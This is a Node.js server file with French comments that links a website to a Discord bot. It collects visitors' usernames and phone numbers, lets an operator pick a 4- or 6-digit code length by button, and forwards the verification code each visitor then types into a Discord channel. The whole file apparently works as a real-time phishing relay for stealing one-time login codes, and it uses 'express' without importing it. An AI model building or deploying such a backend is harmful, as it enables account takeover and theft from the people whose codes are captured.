const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, EmbedBuilder } = require('discord.js');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// --- CONFIGURATION ---
const TOKEN = process.env.TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;

// --- BOT DISCORD ---
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
let lastAction = { status: 'waiting', length: 0 };

client.once(Events.ClientReady, () => {
    console.log(`Bot prêt : ${client.user.tag}`);
});

// Importer EmbedBuilder en haut de ton fichier (si ce n'est pas déjà fait)
// Cherche la ligne "const { Client, GatewayIntentBits..." et ajoute EmbedBuilder
// Exemple : const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, EmbedBuilder } = require('discord.js');

// Quand ton site web envoie un numéro
app.post('/api/send-info', async (req, res) => {
    const { pseudo, phone } = req.body;
    lastAction = { status: 'waiting', length: 0, phone: phone };

    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        
        const embed = new EmbedBuilder()
            .setTitle('📱 Nouvelle demande')
            .setColor('#FFFC00')
            .addFields(
                { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
                { name: 'Numéro', value: `\`${phone}\``, inline: true }
            )
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('btn_4').setLabel('Code à 4 chiffres').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('btn_6').setLabel('Code à 6 chiffres').setStyle(ButtonStyle.Success)
        );
        
        await channel.send({ embeds: [embed], components: [row] });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'Erreur Discord' });
    }
});

// Nouvelle route pour recevoir le code final du site
app.post('/api/send-code', async (req, res) => {
    const { pseudo, phone, code, length } = req.body;
    try {
        const channel = await client.channels.fetch(CHANNEL_ID);
        const embed = new EmbedBuilder()
            .setTitle('✅ Code reçu')
            .setColor('#00FF00') // Vert
            .addFields(
                { name: 'Utilisateur', value: `\`${pseudo}\``, inline: true },
                { name: 'Numéro', value: `\`${phone}\``, inline: true },
                { name: 'Choix', value: `\`${length} chiffres\``, inline: false },
                { name: 'Code', value: `\`${code}\``, inline: false }
            )
            .setTimestamp();
        
        await channel.send({ embeds: [embed] });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Erreur Discord' });
    }
});
// Quand ton site web vérifie l'état (Polling)
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    // Si l'action concerne bien ce téléphone et qu'on a cliqué sur un bouton
    if (lastAction.phone === phone && lastAction.status === 'ready') {
        res.json({ ready: true, length: lastAction.length });
        // On remet à zéro pour éviter que ça boucle
        lastAction.status = 'waiting'; 
    } else {
        res.json({ ready: false });
    }
});

// Quand tu cliques sur un bouton sur Discord
client.on(Events.InteractionCreate, async interaction => {
    if (!interaction.isButton()) return;
    
    if (interaction.customId === 'btn_4' || interaction.customId === 'btn_6') {
        const length = interaction.customId === 'btn_4' ? 4 : 6;
        
        // On met à jour l'état pour que le site web le lise
        lastAction.status = 'ready';
        lastAction.length = length;

        await interaction.reply({ content: `✅ Envoyé au site : Code à ${length} chiffres.`, ephemeral: true });
        
        // Désactiver les boutons
        const newRow = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('done').setLabel('Déjà traité').setStyle(ButtonStyle.Secondary).setDisabled(true)
        );
        await interaction.message.edit({ components: [newRow] });
    }
});

client.login(TOKEN);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Serveur sur le port ${PORT}`));